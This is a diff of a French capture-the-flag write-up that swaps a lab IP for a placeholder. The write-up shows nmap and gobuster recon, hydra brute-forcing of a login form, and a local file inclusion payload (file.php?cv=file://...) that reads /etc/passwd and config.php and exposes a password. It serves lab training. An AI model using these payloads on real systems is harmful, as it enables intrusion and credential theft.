@@ -1,9 +1,9 @@
 # Recon
 
 ```bash
-ping 10.129.187.189
+ping <TARGET_IP>
 
-sudo nmap -sV -sC -oA nmap/initial 10.129.187.189
+sudo nmap -sV -sC -oA nmap/initial <TARGET_IP>
 ```
 
 ### Résultats
@@ -21,7 +21,7 @@ Présence d'un serveur DNS et d'une application web.
 # Analyse HTTP
 
 ```bash
-curl -I http://10.129.187.189
+curl -I http://<TARGET_IP>
 ```
 
 ```http
@@ -39,7 +39,7 @@ L'application utilise des sessions PHP.
 
 ```bash
 gobuster dir \
--u http://10.129.187.189 \
+-u http://<TARGET_IP> \
 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
 
 301
@@ -111,7 +111,7 @@ Test avec un mot de passe invalide :
 
 ```bash
 hydra -V -l hr -p test123 \
-10.129.187.189 \
+<TARGET_IP> \
 http-post-form "/:username=^USER^&password=^PASS^&login=:F=Invalid credentials"
 ```
 
@@ -124,7 +124,7 @@ La condition d'échec est correctement détectée.
 ```bash
 hydra -V -t 32 -l hr \
 -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt \
-10.129.187.189 \
+<TARGET_IP> \
 http-post-form "/:username=^USER^&password=^PASS^&login=:F=Invalid credentials"
 ```
 
@@ -145,10 +145,10 @@ The Recruit API is used internally to fetch and process candidate CVs from exter
 
 
 ```bash
-curl "http://10.129.187.189/file.php?cv=test"
-curl "http://10.129.187.189/file.php?cv=config.php"
-curl "http://10.129.187.189/file.php?cv=/etc/passwd"
-curl "http://10.129.187.189/file.php?cv=http://127.0.0.1/config.php"
+curl "http://<TARGET_IP>/file.php?cv=test"
+curl "http://<TARGET_IP>/file.php?cv=config.php"
+curl "http://<TARGET_IP>/file.php?cv=/etc/passwd"
+curl "http://<TARGET_IP>/file.php?cv=http://<TARGET_IP>/config.php"
 
 Only local files are allowed
 ```
@@ -156,7 +156,7 @@ Only local files are allowed
 L'analyse de la documentation laisse supposer l'utilisation de wrappers PHP. Un test avec le protocole `file://` est alors réalisé :
 
 ```bash
-curl "http://10.129.187.189/file.php?cv=file:///var/www/html/config.php"
+curl "http://<TARGET_IP>/file.php?cv=file:///var/www/html/config.php"
 
 $HR_PASSWORD = 'hrpassword123';
 ```
@@ -188,7 +188,7 @@ Une fois authentifié, accès à :
 Flag utilisateur :
 
 ```text
-THM{LOGGED_IN_USER}
+THM{...}
 ```
 
 ---
@@ -198,7 +198,7 @@ THM{LOGGED_IN_USER}
 Lecture du code source :
 
 ```bash
-curl "http://10.129.187.189/file.php?cv=file:///var/www/html/dashboard.php"
+curl "http://<TARGET_IP>/file.php?cv=file:///var/www/html/dashboard.php"
 ```
 
 Découverte de la requête SQL :
